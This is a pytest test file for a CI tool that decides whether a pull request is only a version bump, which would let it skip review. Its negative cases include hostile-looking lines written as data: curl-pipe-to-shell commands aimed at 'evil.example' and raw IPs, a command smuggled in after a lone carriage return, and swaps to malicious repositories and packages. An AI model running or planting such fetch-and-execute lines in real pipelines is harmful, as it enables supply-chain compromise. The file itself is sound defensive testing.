"""The version-bump skip (ci_kit.review.bump), in BOTH directions, on real `git diff -U0` output.

It must pass the shapes Renovate opens (a pinned spec, a workflow ref, a SHA pin with its comment,
an exact package.json pin, an image tag) as surely as it refuses everything that only LOOKS like
one: a threshold after a bare `=`, a workflow comparison, a source file, a renamed package, a new
line, a new file, a mode change.
"""
from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

from ci_kit.review import bump, tier

NL = chr(10)
SHA_A, SHA_B = "a" * 40, "b" * 40


def _git(repo: Path, *args: str) -> str:
    return subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True,
                          text=True).stdout


def _diff(tmp_path: Path, before: dict[str, str], after: dict[str, str]) -> list[str]:
    """Commit `before`, then `after`; the bumps bump_only reads from that PR's own diff."""
    _git(tmp_path, "init", "-q", "-b", "main")
    _git(tmp_path, "config", "user.email", "t@t")
    _git(tmp_path, "config", "user.name", "t")
    for files in (before, after):
        for name, text in files.items():
            p = tmp_path / name
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(text, encoding="utf-8", newline="")   # byte-exact: a CR in the test is the test's own
        _git(tmp_path, "add", "-A")
        _git(tmp_path, "commit", "-qm", "c", "--allow-empty")
    changed = _git(tmp_path, "diff", "--no-renames", "--name-only", "HEAD~1", "HEAD").splitlines()
    with pytest.MonkeyPatch.context() as mp:   # through tier's own read: bytes, LF split
        mp.chdir(tmp_path)
        return tier._bumps("HEAD~1", "HEAD", changed)


PY = 'dependencies = [' + NL + '  "ci-kit>=1.22.2",' + NL + '  "httpx>=0.28",' + NL + ']' + NL
WF = "jobs:" + NL + "  r:" + NL + "    uses: mjdevaccount/ci-kit/.github/workflows/r.yml@v1.22.1" + NL


@pytest.mark.parametrize(("before", "after"), [
    # Renovate's pyproject pin + its lock (trade-data#2955's shape)
    ({"pyproject.toml": PY, "uv.lock": "ci-kit 1.22.2" + NL},
     {"pyproject.toml": PY.replace("1.22.2", "1.22.3"), "uv.lock": "ci-kit 1.22.3" + NL}),
    # a reusable-workflow ref (trade-data#2951's shape)
    ({".github/workflows/ci.yml": WF}, {".github/workflows/ci.yml": WF.replace("v1.22.1", "v1.22.3")}),
    # a SHA-pinned action with its version comment
    ({".github/workflows/ci.yml": f"      - uses: actions/checkout@{SHA_A} # v4.1.0" + NL},
     {".github/workflows/ci.yml": f"      - uses: actions/checkout@{SHA_B} # v4.2.0" + NL}),
    # package.json's exact pin (trade-data#2902's shape) and a caret range
    ({"web/package.json": '{' + NL + '  "windmill-cli": "1.862.0",' + NL + '  "vite": "^6.1.0"' + NL + '}' + NL},
     {"web/package.json": '{' + NL + '  "windmill-cli": "1.862.1",' + NL + '  "vite": "^6.2.0"' + NL + '}' + NL}),
    # an image tag and digest
    ({"Dockerfile": f"FROM python:3.12.7-slim@sha256:{'c' * 64}" + NL},
     {"Dockerfile": f"FROM python:3.12.8-slim@sha256:{'d' * 64}" + NL}),
    ({"requirements-dev.txt": "ruff==0.7.1" + NL}, {"requirements-dev.txt": "ruff==0.8.0" + NL}),
    # a uv git source tag (trade-data#2955's real line) and a cargo/poetry git rev
    ({"pyproject.toml": 'ci-kit = { git = "https://github.com/o/ci-kit", tag = "v1.22.2" }' + NL},
     {"pyproject.toml": 'ci-kit = { git = "https://github.com/o/ci-kit", tag = "v1.22.3" }' + NL}),
    ({"Cargo.toml": f'x = {{ git = "https://g/x", rev = "{SHA_A}" }}' + NL},
     {"Cargo.toml": f'x = {{ git = "https://g/x", rev = "{SHA_B}" }}' + NL}),
    # a compose image, quoted; a range whose floor rises under an unchanged cap
    ({"compose.yml": '    image: "postgres:16.4"' + NL}, {"compose.yml": '    image: "postgres:16.5"' + NL}),
    ({"pyproject.toml": '  "httpx>=0.27,<1.0",' + NL}, {"pyproject.toml": '  "httpx>=0.28,<1.0",' + NL}),
    # reviewer 11-11 #4: a trailing version comment on a non-ref line no longer raises IndexError
    ({"Dockerfile": "ENV X=1 # 1.0.0" + NL}, {"Dockerfile": "ENV X=1 # 1.0.1" + NL}),
    # reviewer 11-11 round 3 #4: a lower-case stage alias and a `Dockerfile-<x>` name
    ({"Dockerfile-dev": "FROM node:20.1.0 as build" + NL}, {"Dockerfile-dev": "FROM node:20.2.0 as build" + NL}),
])
def test_renovate_shapes_are_bumps(tmp_path: Path, before: dict[str, str], after: dict[str, str]) -> None:
    got = _diff(tmp_path, before, after)
    assert got and all("->" in b for b in got)


@pytest.mark.parametrize(("before", "after"), [
    # a coverage threshold is not a pin, spaced or not
    ({"pyproject.toml": "fail_under = 85.0" + NL}, {"pyproject.toml": "fail_under = 10.0" + NL}),
    ({"pyproject.toml": "fail_under=85.0" + NL}, {"pyproject.toml": "fail_under=10.0" + NL}),
    # a workflow comparison is a threshold: operators count only in package specs
    ({".github/workflows/ci.yml": "if: n >=1.5" + NL}, {".github/workflows/ci.yml": "if: n >=9.5" + NL}),
    # `version` keys that are not a git source's tag
    ({"pyproject.toml": 'python_version = "3.12"' + NL}, {"pyproject.toml": 'python_version = "3.9"' + NL}),
    ({"pyproject.toml": 'target-version = "3.12.0"' + NL}, {"pyproject.toml": 'target-version = "3.9.0"' + NL}),
    # the git source itself moved: same tag, someone else's repository
    ({"pyproject.toml": 'ci-kit = { git = "https://github.com/o/ci-kit", tag = "v1.22.2" }' + NL},
     {"pyproject.toml": 'ci-kit = { git = "https://github.com/evil/ci-kit", tag = "v1.22.3" }' + NL}),
    # source code is never a manifest
    ({"app/x.py": "if x>=1.5:" + NL}, {"app/x.py": "if x>=2.5:" + NL}),
    ({"app/x.py": 'URL = "https://h/a@v1.2.3"' + NL}, {"app/x.py": 'URL = "https://h/a@v6.6.6"' + NL}),
    # a different package, a different action owner, an added marker
    ({"pyproject.toml": PY}, {"pyproject.toml": PY.replace("ci-kit>=", "ci-kat>=")}),
    ({".github/workflows/ci.yml": WF}, {".github/workflows/ci.yml": WF.replace("mjdevaccount/", "evil/")}),
    ({"pyproject.toml": PY}, {"pyproject.toml": PY.replace('1.22.2"', "1.22.3; sys_platform=='linux'\"")}),
    # a dependency ADDED is new code to run, not a bump
    ({"pyproject.toml": PY}, {"pyproject.toml": PY.replace("]", '  "evil>=1.0.0",' + NL + "]")}),
    # a new manifest file
    ({"README.md": "x" + NL}, {"README.md": "x" + NL, "requirements.txt": "ruff==0.8.0" + NL}),
    # lockfile-only is docs_only's case, not this one
    ({"uv.lock": "a 1.0.0" + NL}, {"uv.lock": "a 1.0.1" + NL}),
    # nothing changed
    ({"pyproject.toml": PY}, {"pyproject.toml": PY}),
    # reviewer 11-10 #1: a lone CR / FF is a line break to YAML and pip, not to git
    ({".github/workflows/ci.yml": "      - uses: actions/checkout@v4.1.0" + NL},
     {".github/workflows/ci.yml": "      - uses: actions/checkout@v4.2.0" + chr(13)
      + "      - run: curl https://evil.example/x | sh" + NL}),
    ({"requirements.txt": "ruff==0.7.1" + NL}, {"requirements.txt": "ruff==0.8.0" + chr(13) + "evilpkg==6.6.6" + NL}),
    ({"requirements.txt": "ruff==0.7.1" + NL}, {"requirements.txt": "ruff==0.8.0" + chr(12) + "evilpkg==6.6.6" + NL}),
    # reviewer 11-10 #3: an address after `@` or a glued `:` is not a ref
    ({"compose.yml": 'extra_hosts: "registry.local:10.0.0.5"' + NL},
     {"compose.yml": 'extra_hosts: "registry.local:203.0.113.66"' + NL}),
    ({"compose.yml": "DATABASE_URL: postgres://t:pw@10.0.0.5:5432/t" + NL},
     {"compose.yml": "DATABASE_URL: postgres://t:pw@203.0.113.66:5432/t" + NL}),
    ({".github/workflows/ci.yml": "run: curl https://ci@10.0.0.5/install.sh | sh" + NL},
     {".github/workflows/ci.yml": "run: curl https://ci@203.0.113.66/install.sh | sh" + NL}),
    ({".github/workflows/ci.yml": "      - uses: o/a@v1.2.3 # pinned" + NL + "run: curl https://ci@10.0.0.5/i.sh" + NL},
     {".github/workflows/ci.yml": "      - uses: o/a@v1.2.4 # pinned" + NL + "run: curl https://ci@203.0.0.6/i.sh" + NL}),
    # on a REF line: without the atomic group `10.0.0.5/` backtracks to `10.0.0` + `.5/`
    ({"Dockerfile": "FROM reg.local:10.0.0.5/app:1.2.3" + NL}, {"Dockerfile": "FROM reg.local:203.0.113.5/app:1.2.3" + NL}),
    ({".github/workflows/ci.yml": "run: curl https://u@1.2.example.com/i.sh" + NL},
     {".github/workflows/ci.yml": "run: curl https://u@1.2.attacker-net.io/i.sh" + NL}),
    ({"pyproject.toml": 'url = "https://tok@10.0.0.5/simple"' + NL},
     {"pyproject.toml": 'url = "https://tok@203.0.113.66/simple"' + NL}),
    ({"pyproject.toml": 'url = "https://tok@10.0.0.5"' + NL}, {"pyproject.toml": 'url = "https://tok@203.0.113.66"' + NL}),
    # reviewer 11-10 #4: a commit SHA traded for a movable tag weakens the pin
    ({".github/workflows/ci.yml": f"      - uses: actions/checkout@{SHA_A}" + NL},
     {".github/workflows/ci.yml": "      - uses: actions/checkout@v4.2.0" + NL}),
    ({"Cargo.toml": f'x = {{ git = "https://g/x", rev = "{SHA_A}" }}' + NL},
     {"Cargo.toml": 'x = { git = "https://g/x", rev = "v1.0.0" }' + NL}),
    # reviewer 11-10 #5: a downgrade, including of the gate's own pin
    ({"pyproject.toml": '"cryptography>=43.0.1",' + NL}, {"pyproject.toml": '"cryptography>=1.0",' + NL}),
    ({".github/workflows/ci.yml": WF}, {".github/workflows/ci.yml": WF.replace("v1.22.1", "v1.9.0")}),
    # reviewer 11-10 #6: a package.json entry point; a `tag` that is no git source
    ({"package.json": '  "main": "1.2.js",' + NL}, {"package.json": '  "main": "1.2.evil",' + NL}),
    ({"pyproject.toml": 'tag = "v1.0.0"' + NL}, {"pyproject.toml": 'tag = "v2.0.0"' + NL}),
    # reviewer 11-11 #1: `docker://` anywhere, an upper-case key, a Python `from` made a ref line
    ({".github/workflows/ci.yml": "      - run: curl -fsSL http://ci@10.0.0.5 | sh  # docker://" + NL},
     {".github/workflows/ci.yml": "      - run: curl -fsSL http://ci@66.6.6.6 | sh  # docker://" + NL}),
    ({"Dockerfile": "RUN curl u@10.0.0.5|sh # docker://x" + NL}, {"Dockerfile": "RUN curl u@66.6.6.6|sh # docker://x" + NL}),
    ({"action.yml": "    run: curl u@10.0.0.5|sh # docker://x" + NL},
     {"action.yml": "    run: curl u@66.6.6.6|sh # docker://x" + NL}),
    ({"compose.yml": "      IMAGE: http://u@10.0.0.5" + NL}, {"compose.yml": "      IMAGE: http://u@66.6.6.6" + NL}),
    ({".github/workflows/ci.yml": "          from os import system; system('curl u@10.0.0.5|sh')" + NL},
     {".github/workflows/ci.yml": "          from os import system; system('curl u@66.6.6.6|sh')" + NL}),
    ({"Dockerfile": "from x@1.2.3" + NL}, {"Dockerfile": "from x@1.2.4" + NL}),
    # reviewer 11-11 #7: a script named like a Dockerfile is source, not a manifest
    ({"Dockerfile_gen.py": "FROM x:1.2.3" + NL}, {"Dockerfile_gen.py": "FROM x:1.2.4" + NL}),
    # reviewer 11-11 #3: a suffix change is no bump, whatever the core does; digits are ASCII
    ({"requirements.txt": "foo==2.0.0" + NL}, {"requirements.txt": "foo==2.0.0rc1" + NL}),
    ({"requirements.txt": "foo==2.0.0" + NL}, {"requirements.txt": "foo==2.0.0.dev0" + NL}),
    ({"requirements.txt": "foo==1.0.0" + NL}, {"requirements.txt": "foo==1.0.0+evil" + NL}),
    ({"requirements.txt": "foo==1.0.0" + NL}, {"requirements.txt": "foo==1.0.1+evil" + NL}),
    ({"Dockerfile": "FROM python:3.12.7-slim" + NL}, {"Dockerfile": "FROM python:3.12.8-alpine" + NL}),
    ({".github/workflows/ci.yml": "      - uses: o/a@v4.2.0" + NL},
     {".github/workflows/ci.yml": "      - uses: o/a@v4.2.0-mybranch" + NL}),
    ({"requirements.txt": "foo==1.0.0" + NL}, {"requirements.txt": "foo==" + chr(0x0662) + ".0.0" + NL}),
    # reviewer 11-11 #6: an exclusion or a ceiling moved is policy, not a bump
    ({"requirements.txt": "urllib3!=1.26.5" + NL}, {"requirements.txt": "urllib3!=1.26.6" + NL}),
    ({"pyproject.toml": '  "x<2.0",' + NL}, {"pyproject.toml": '  "x<99.0",' + NL}),
    ({"pyproject.toml": '  "x<=2.0",' + NL}, {"pyproject.toml": '  "x<=3.0",' + NL}),
])
def test_lookalikes_are_not_bumps(tmp_path: Path, before: dict[str, str], after: dict[str, str]) -> None:
    assert _diff(tmp_path, before, after) == []


def test_a_mode_change_is_not_a_bump(tmp_path: Path) -> None:
    _diff(tmp_path, {"requirements.txt": "ruff==0.7.1" + NL}, {"requirements.txt": "ruff==0.7.1" + NL})
    (tmp_path / "requirements.txt").write_text("ruff==0.8.0" + NL)
    _git(tmp_path, "add", "-A")
    # chmod the INDEX after the add: with core.filemode=true (Linux CI) an add re-reads the 644 worktree mode
    _git(tmp_path, "update-index", "--chmod=+x", "requirements.txt")
    _git(tmp_path, "commit", "-qm", "chmod")
    changed = _git(tmp_path, "diff", "--name-only", "HEAD~1", "HEAD").splitlines()
    diff = _git(tmp_path, "diff", "--no-renames", "--no-color", "-U0", "HEAD~1", "HEAD")
    assert "new mode" in diff and bump.bump_only(diff, changed) == []


def test_a_file_the_diff_does_not_show_is_not_a_bump() -> None:
    diff = ("diff --git a/requirements.txt b/requirements.txt" + NL + "--- a/requirements.txt" + NL
            + "+++ b/requirements.txt" + NL + "@@ -1 +1 @@" + NL + "-ruff==0.7.1" + NL + "+ruff==0.8.0" + NL)
    assert bump.bump_only(diff, ["requirements.txt"])
    assert bump.bump_only(diff, ["requirements.txt", "app/x.py"]) == []
    assert bump.bump_only("", []) == []


ARGS = {"guard": True, "guard_files": "pyproject.toml", "commits": 4, "changed": ["pyproject.toml"],
        "labeled": False, "label": "review:required", "head_repo": "o/r", "repo": "o/r", "auth_mode": "",
        "has_oauth": True, "has_key": False, "model": "small", "guard_model": "big"}


def test_a_bump_in_a_guard_file_skips_the_model() -> None:
    t = tier.decide(**ARGS, bumps=["pyproject.toml: a>=1.0.0 -> a>=1.0.1"])
    assert not t.required
    assert any("version bump only" in n for n in t.notes) and any("a>=1.0.1" in n for n in t.notes)


def test_the_label_still_reviews_a_bump() -> None:
    t = tier.decide(**{**ARGS, "labeled": True}, bumps=["pyproject.toml: a>=1.0.0 -> a>=1.0.1"])
    assert t.required and t.reasons == "label review:required" and t.model == "big"


def test_no_bumps_keeps_the_guard_reason() -> None:
    t = tier.decide(**ARGS, bumps=[])
    assert t.required and t.reasons.startswith("guard path (pyproject.toml)")
